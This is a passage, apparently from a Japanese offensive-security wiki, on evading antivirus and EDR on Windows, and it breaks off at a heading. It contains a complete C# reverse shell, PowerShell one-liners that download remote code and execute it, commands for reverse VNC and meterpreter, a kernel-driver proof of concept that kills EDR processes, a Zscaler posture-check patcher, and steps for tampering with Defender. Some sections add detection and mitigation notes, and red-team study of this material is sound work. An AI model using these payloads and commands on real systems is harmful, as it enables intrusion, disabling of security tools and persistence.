ペイロードはディスクに触れず直接メモリにロードされるため、プロセス全体で AMSI をパッチすることだけを考慮すれば良くなります。

ほとんどの C2 フレームワーク（sliver, Covenant, metasploit, CobaltStrike, Havoc など）は既に C# アセンブリをメモリ上で直接実行する機能を提供していますが、実行方法にはいくつかの違いがあります:

- **Fork\&Run**

これは **新しい犠牲プロセスを生成（spawn）** し、その新しいプロセスにポストエクスプロイト用の悪意あるコードを注入、実行し終了後にそのプロセスを殺す、という手法です。利点と欠点の両方があります。利点は実行が我々の Beacon implant プロセスの**外部**で行われることです。つまり、ポストエクスプロイトの処理で何か問題が起きたり検知されても、**implant が生き残る可能性が高くなります。** 欠点は Behavioural Detections によって検知される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これはポストエクスプロイト用の悪意あるコードを**自プロセスに注入する**方法です。新しいプロセスを作成して AV にスキャンされるのを避けられますが、ペイロードの実行で何か問題が起きるとプロセスがクラッシュして **beacon を失う**可能性が高くなります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについて詳しく知りたい場合はこの記事を参照してください: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) および InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

PowerShell から C# Assemblies をロードすることも可能です。例: [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を参照してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、攻撃者が管理する SMB 共有上に設置されたインタプリタ環境へのアクセスを被害マシンに与えることで、他の言語を使って悪意あるコードを実行することが可能です。

SMB 共有上の Interpreter Binaries と環境にアクセスを許可することで、被害マシンのメモリ内でこれらの言語による任意コードを**実行**できます。

リポジトリによれば：Defender は依然としてスクリプトをスキャンするが、Go, Java, PHP 等を利用することで**静的シグネチャの回避に対して柔軟性が高まる**。これらの言語でのランダムな非難読化 reverse shell スクリプトでのテストは成功していると報告されています。

## TokenStomping

Token stomping は、攻撃者がアクセス トークンや EDR や AV のようなセキュリティ製品のトークンを操作し、プロセスが終了しないまま権限を低下させて悪意のある活動を検査・検出できないようにする手法です。

これを防ぐために、Windows はセキュリティプロセスのトークンに対して外部プロセスがハンドルを取得することを**防ぐ**ことが考えられます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) に記載されているように、被害者の PC に Chrome Remote Desktop を展開して takeover や persistence を確立するのは簡単です:
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH" をクリックして、Windows 用 MSI ファイルをダウンロードします。
2. 被害マシンでサイレントインストールを実行（管理者権限が必要）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻り Next をクリックします。ウィザードが認可を求めるので、Authorize ボタンをクリックして続行します。
4. 指定されたパラメータを少し調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （GUI を使わずにピンを設定できる pin パラメータに注意）

## Advanced Evasion

Evasion は非常に複雑なトピックで、単一のシステム内に存在する多様なテレメトリソースを考慮しなければならないことが多く、成熟した環境で完全に検知を回避するのはほぼ不可能です。

対峙する環境ごとに強みと弱みがあり、それぞれ異なります。

より高度な Evasion 手法に関して理解を深めたい場合は、[@ATTL4S](https://twitter.com/DaniLJ94) のこのトークを見ることを強く推奨します。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これはまた、[@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth の素晴らしいトークです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、バイナリの一部を順次**削除**しながら Defender がどの部分を悪性として検出しているかを見つけ出して分割して教えてくれます。\
同様のことを行うツールとしては、[**avred**](https://github.com/dobin/avred) があり、公開ウェブサービスを [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) で提供しています。

### **Telnet Server**

Windows10 以前では、すべての Windows に管理者がインストール可能な **Telnet server** が付属していました。インストールは次のように行います：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時にそれを**開始**し、今すぐ**実行**してください:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet ポートを変更** (stealth) と firewall を無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

ダウンロード: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setupではなく、bin版のダウンロードを選んでください)

**ON THE HOST**: _**winvnc.exe**_ を実行し、サーバを設定する:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と **新たに** 作成されたファイル _**UltraVNC.ini**_ を **victim** の中に移動する

#### **Reverse connection**

The **attacker** は自分の **host** 上でバイナリ `vncviewer.exe -listen 5900` を実行して、reverse **VNC connection** を受け取る準備をしておくべきです。次に、**victim** 内では: winvnc デーモン `winvnc.exe -run` を起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行する

**WARNING:** ステルスを維持するために、いくつかのことを行ってはいけません

- `winvnc` が既に実行中の場合は起動しないこと。さもないと[ポップアップ](https://i.imgur.com/1SROTTl.png)が表示されます。実行中かどうかは `tasklist | findstr winvnc` で確認してください
- `UltraVNC.ini` が同じディレクトリにない状態で `winvnc` を起動すると、[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開いてしまうので起動しないこと
- ヘルプのために `winvnc -h` を実行すると[ポップアップ](https://i.imgur.com/oc18wcu.png)が表示されるので行わないこと

### GreatSCT

ダウンロード: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc` で **lister を起動** し、次のコマンドで **xml payload** を **実行** します：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の Defender はプロセスをすぐに終了させます。**

### 自分で reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

以下のコマンドでコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
次のように使用する:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# を使ったコンパイル
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 難読化ツール一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### pythonを使用したビルドインジェクタの例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間からの AV/EDR の停止

Storm-2603 は、ランサムウェアを展開する前にエンドポイント保護を無効化するため、**Antivirus Terminator** として知られる小さなコンソールユーティリティを利用しました。このツールは**独自の脆弱だが *署名された* ドライバ**を持ち込み、それを悪用して Protected-Process-Light (PPL) の AV サービスでさえ阻止できない特権カーネル操作を実行します。

主なポイント
1. **Signed driver**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、実体のバイナリは Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる正当に署名されたドライバ `AToolsKrnl64.sys` です。ドライバが有効な Microsoft の署名を持っているため、Driver-Signature-Enforcement (DSE) が有効でも読み込まれます。
2. **サービスのインストール**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
最初の行はドライバを**カーネルサービス**として登録し、2行目はそれを起動して `\\.\ServiceMouse` がユーザランドからアクセス可能になるようにします。
3. **ドライバが公開する IOCTLs**
| IOCTL code | 機能                                    |
|-----------:|-----------------------------------------|
| `0x99000050` | PID で任意のプロセスを終了（Defender/EDR サービスの停止に使用） |
| `0x990000D0` | ディスク上の任意のファイルを削除 |
| `0x990001D0` | ドライバをアンロードしてサービスを削除 |

最小限の C の proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. なぜ機能するか: BYOVD はユーザーモードの保護を完全に回避します。カーネルで実行されるコードは *protected* プロセスを開いたり、終了させたり、PPL/PP、ELAM またはその他のハードニング機能に関係なくカーネルオブジェクトを改ざんしたりできます。

検出 / 対策
• Microsoft の脆弱ドライバブロックリスト（`HVCI`, `Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにする。  
• 新しい *kernel* サービスの作成を監視し、ドライバがワールドライト可能なディレクトリからロードされた場合、または許可リストに存在しない場合にアラートを出す。  
• カスタムデバイスオブジェクトへのユーザーモードハンドルが作成された後に、疑わしい `DeviceIoControl` 呼び出しが行われていないか監視する。

### Zscaler Client Connector の Posture チェックをオンディスクのバイナリパッチでバイパスする

Zscaler の **Client Connector** はデバイスポスチャルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC を使用します。次の2つの設計上の弱点により完全なバイパスが可能になります：

1. ポスチャ評価は **完全にクライアント側で** 行われる（サーバにはブール値が送られる）。  
2. 内部の RPC エンドポイントは、接続してくる実行ファイルが **Zscaler によって署名されている** ことのみを検証する（`WinVerifyTrust` 経由）。

ディスク上の 4 つの署名済みバイナリを**パッチすることで**、両方の仕組みを無効化できます：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返し、すべてのチェックを合格させる |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ 署名されていないプロセスでも RPC パイプにバインドできるようになる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 短絡化された |

最小限のパッチャー抜粋：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換え、サービススタックを再起動した後：

* **すべての** posture checks が **緑/準拠** と表示される。
* 署名されていない、または改変されたバイナリが named-pipe の RPC エンドポイントを開ける（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 侵害されたホストは Zscaler ポリシーで定義された内部ネットワークに対して無制限のアクセスを得る。

このケーススタディは、純粋にクライアント側の信頼判断や単純な署名検査が数バイトのパッチでいかに破られるかを示している。

## Protected Process Light (PPL) を悪用して LOLBINs で AV/EDR を改ざんする

Protected Process Light (PPL) は署名者/レベルの階層を強制し、同等またはより高い保護プロセスのみがお互いを改ざんできるようにする。攻撃的には、PPL 対応のバイナリを正当に起動し引数を制御できれば、正当な機能（例: ログ出力）を AV/EDR が使用する保護されたディレクトリに対する制約付きの、PPL 支援の書き込みプリミティブに変換できる。

What makes a process run as PPL
- ターゲットの EXE（およびロードされる DLL）は PPL 対応の EKU で署名されている必要がある。
- プロセスは CreateProcess でフラグ: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` を使用して作成される必要がある。
- バイナリの署名者に合わせた互換性のある保護レベルを要求する必要がある（例: アンチマルウェア署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。不適切なレベルだと作成が失敗する。

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数をターゲットの EXE に渡す）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用パターン:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分でプロセスを生成し、呼び出し元が指定したパスにログファイルを書き込むパラメータを受け取ります。
- PPL プロセスとして起動すると、ファイル書き込みは PPL の保護付きで行われます。
- ClipUp はスペースを含むパスを解析できません。通常保護された場所を指定するには 8.3 短縮パスを使用してください。

8.3 short path helpers
- 短縮名を一覧表示: `dir /x` を各親ディレクトリで実行します。
- cmd で短縮パスを導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` で PPL 対応の LOLBIN (ClipUp) を起動します。
2) ClipUp のログパス引数を渡して、保護された AV ディレクトリ（例: Defender Platform）にファイル作成を強制します。必要なら 8.3 短縮名を使用してください。
3) 対象バイナリが通常実行中に AV によって開かれ/ロックされている場合（例: MsMpEng.exe）、AV 起動前のブート時に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールしてスケジュールします。ブート順序は Process Monitor（boot logging）で検証してください。
4) 再起動時に PPL バックされた書き込みが AV がバイナリをロックする前に行われ、対象ファイルを破損させ起動できなくします。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp が書き込む内容は配置以外で制御できない; このプリミティブは正確なコンテンツ注入というより破損向けである。
- サービスのインストール/起動にはローカル管理者/SYSTEM 権限と再起動の猶予が必要。
- タイミングが重要: 対象が開かれていないことが必須; ブート時実行はファイルロックを回避する。

Detections
- ブート時前後に、非標準のランチャーを親に持つなど異常な引数での `ClipUp.exe` のプロセス作成。
- 自動起動に設定された疑わしいバイナリの新サービス、かつ常に Defender/AV より先に起動している。Defender の起動失敗前に行われたサービス作成/変更を調査する。
- Defender バイナリ/Platform ディレクトリに対するファイル整合性監視；protected-process フラグを持つプロセスによる予期しないファイル作成/変更を検出する。
- ETW/EDR テレメトリ: `CREATE_PROTECTED_PROCESS` で作成されたプロセスや、非-AV バイナリによる異常な PPL レベルの利用を確認する。

Mitigations
- WDAC/Code Integrity: どの署名済みバイナリが PPL として、どの親の下で実行できるかを制限する；正当な文脈外での ClipUp 呼び出しをブロックする。
- サービス管理: 自動起動サービスの作成/変更を制限し、起動順序の操作を監視する。
- Defender の tamper protection と early-launch 保護が有効になっていることを確認する；バイナリ破損を示す起動エラーを調査する。
- 環境が許すなら、セキュリティツールをホストするボリュームで 8.3 ショートネーム生成を無効にすることを検討する（十分にテストすること）。

References for PPL and tooling
- Microsoft Protected Processes の概要: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU リファレンス: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon ブートログ（順序検証）: https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- 技術記事 (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender は実行するプラットフォームを、次のフォルダ配下のサブフォルダを列挙して選択する:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

この中で辞書順（lexicographic）で最も大きいバージョン文字列のサブフォルダ（例: `4.18.25070.5-0`）を選び、そこから Defender サービスのプロセスを起動する（サービス/レジストリのパスも更新される）。この選択はディレクトリエントリ（directory reparse points (symlinks) を含む）を信用するため、管理者はこれを利用して Defender を攻撃者が書き込み可能なパスへリダイレクトし、DLL sideloading やサービスの破壊を達成できる。

Preconditions
- ローカル管理者（Platform フォルダ配下にディレクトリ/シンボリックリンクを作成するために必要）
- 再起動または Defender プラットフォームの再選択をトリガーできること（ブート時のサービス再起動）
- 組み込みツールのみで実行可能（mklink）

Why it works
- Defender は自身のフォルダへの書き込みをブロックするが、プラットフォーム選択はディレクトリエントリを信用し、ターゲットが保護/信頼されたパスに解決されるかを検証せずに辞書順で最も大きいバージョンを選択する。

Step-by-step (example)
1) Prepare a writable clone of the current Platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に自分のフォルダを指す、上位バージョンのディレクトリ symlink を作成する:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択 (再起動を推奨):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスのパスが `C:\TMP\AV\` 以下に現れ、サービスの設定／レジストリがその場所を反映していることを確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置／置換して、Defender のプロセス内でコードを実行します。See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意: この手法自体では privilege escalation は行えません。admin rights が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams は、ターゲットモジュールの Import Address Table (IAT) をフックし、選択した APIs を攻撃者制御の position‑independent code (PIC) 経由でルーティングすることで、ランタイム回避を C2 implant からターゲットモジュール自身に移動させることができます。これは多くのキットが露出する小さな API サーフェス（例: CreateProcessA）を超えて回避を一般化し、同じ保護を BOFs や post‑exploitation DLLs にも拡張します。

High-level approach
- reflective loader（prepended または companion）を使ってターゲットモジュールに並置する形で PIC blob をステージする。PIC は self‑contained で position‑independent でなければならない。
- ホスト DLL がロードされる際、IMAGE_IMPORT_DESCRIPTOR を走査し、ターゲットとなるインポート（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）の IAT エントリを薄い PIC ラッパーを指すようにパッチする。
- 各 PIC ラッパーは実際の API アドレスに tail‑call する前に回避処理を実行する。典型的な回避処理には次のものが含まれる:
  - 呼び出し前後のメモリ mask/unmask（例: beacon 領域の暗号化、RWX→RX、ページ名/権限の変更）を行い、呼び出し後に復元する。
  - Call‑stack spoofing: 正常なスタックを構築してターゲット API に遷移し、call‑stack 分析が期待されるフレームに解決されるようにする。
- 互換性のため、インターフェースをエクスポートして Aggressor script（または同等のもの）が Beacon、BOFs、post‑ex DLLs に対してどの APIs をフックするか登録できるようにする。

Why IAT hooking here
- フックされた import を使う任意のコードで動作し、tool code を変更したり Beacon に特定の APIs のプロキシを依存させたりする必要がない。
- post‑ex DLLs をカバーする: LoadLibrary* をフックすることでモジュールロード（例: System.Management.Automation.dll, clr.dll）を横取りし、それらの API 呼び出しに同じ masking/stack evasion を適用できる。
- CreateProcessA/W をラップすることで、call‑stack–based 検知に対して process‑spawning な post‑ex コマンドの信頼性ある利用を回復する。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- パッチは relocations/ASLR の適用後、インポートの最初の使用前に適用する。Reflective loaders like TitanLdr/AceLdr は、ロードされたモジュールの DllMain 中に hooking を行うことを示す。
- ラッパーは小さく PIC-safe に保つ；真の API はパッチ前に取得した元の IAT 値、または LdrGetProcedureAddress を使って解決する。
- PIC に対して RW → RX transitions を使用し、writable+executable ページを残さないこと。

Call‑stack spoofing stub
- Draugr‑style PIC stubs は偽のコールチェーン（無害なモジュールへの return addresses）を構築し、その後実 API にピボットする。
- これは Beacon/BOFs から敏感な APIs へ向かう際に期待される正規のスタックを想定した検出を無効化する。
- API prologue の前に期待されるフレーム内に到達するため、stack cutting/stack stitching techniques と組み合わせて使う。

Operational integration
- reflective loader を post‑ex DLLs の先頭に付加し、DLL がロードされたときに PIC と hooks が自動的に初期化されるようにする。
- Aggressor script を使ってターゲット API を登録し、Beacon と BOFs がコード変更なしで同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non‑image（heap/anon）アドレスに解決されるエントリ；import pointers の定期的な検証。
- Stack anomalies: ロードされたイメージに属さない return addresses；非イメージ PIC への急激な遷移；一貫性のない RtlUserThreadStart の ancestry。
- Loader telemetry: プロセス内からの IAT への書き込み、import thunks を変更するような早期の DllMain 活動、ロード時に作成される予期しない RX 領域。
- Image‑load evasion: LoadLibrary* を hook している場合、memory masking events と相関する automation/clr assemblies の疑わしいロードを監視する。

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) は、現代の info-stealers が AV bypass、anti-analysis、credential access を単一のワークフローでどのように組み合わせるかを示す。

### Keyboard layout gating & sandbox delay

- 設定フラグ（`anti_cis`）は `GetKeyboardLayoutList` を介してインストール済みのキーボードレイアウトを列挙する。キリル文字レイアウトが見つかると、サンプルは空の `CIS` マーカーをドロップして stealers を実行する前に終了し、除外されたロケールで決して起動しないようにしつつ、ハンティング用の痕跡を残す。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 多層化された `check_antivm` ロジック

